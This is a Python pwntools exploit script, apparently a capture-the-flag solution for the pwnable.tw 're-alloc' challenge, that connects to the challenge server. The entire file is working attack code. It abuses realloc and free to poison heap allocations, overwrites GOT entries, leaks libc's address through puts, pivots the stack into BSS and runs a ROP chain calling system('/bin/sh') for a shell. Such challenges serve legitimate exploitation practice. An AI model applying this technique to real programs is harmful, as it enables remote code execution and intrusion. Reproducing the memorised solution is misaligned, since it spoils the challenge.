from pwn import *

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)


def alloc(index, size, data):
    sla(b'choice: ', b'1')
    sla(b'Index:', str(index).encode())
    sla(b'Size:', str(size).encode())
    sa(b'Data:', data)
def realloc(index, size, data):
    sla(b'choice: ', b'2')
    sla(b'Index:', str(index).encode())
    sla(b'Size:', str(size).encode())
    sa(b'Data:', data)
def realloc_free(index):
    sla(b'choice: ', b'2')
    sla(b'Index:', str(index).encode())
    sla(b'Size:', b'0')
def free(index):
    sla(b'choice: ', b'3')
    sla(b'Index:', str(index).encode())

elf = context.binary = ELF('re-alloc')
libc = ELF('libc.so.6')

#nc chall.pwnable.tw 10106

p = remote('chall.pwnable.tw', 10106)
#p = process()


ONE_GADGET = 0x83a04

alloc(0, 0x68, b'A')
alloc(1, 0x60, b'A')


free(0)
realloc_free(1)
realloc(1, 0x68, p64(elf.got['puts']))
alloc(0, 0x68, b'A')
realloc(0, 0x40, b'A')
free(0)
#
#gdb.attach(p, gdbscript='''
#           b realloc
#           b *(read_long + 96)
#c''')
alloc(0, 0x68, p64(elf.plt['puts'] + 6) + p64(elf.symbols['read_long'] + 95) + p64(elf.plt['printf'] + 6) + p64(elf.plt['alarm'] + 6) + p64(elf.symbols['read_input'])[:-1]) # overwrite atoll got
sla(b'Your choice: ', b'1')
sla(B'Index:', b'1')

BSS = 0x404a00
LEAVE = 0x00000000004012be #: leave ; ret
POP_RDI = 0x00000000004017eb #: pop rdi ; ret


rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.read_input(BSS, 0x200)
rop.raw(LEAVE)

payload = b'A'*0x20 + p64(BSS) + rop.chain()
p.send(payload)
leak = p.recv(8)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['puts']
print('libc: ', hex(libc.address))
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))
payload2 = b'A'*8 + p64(POP_RDI + 1) + rop2.chain()

p.send(payload2)


p.interactive()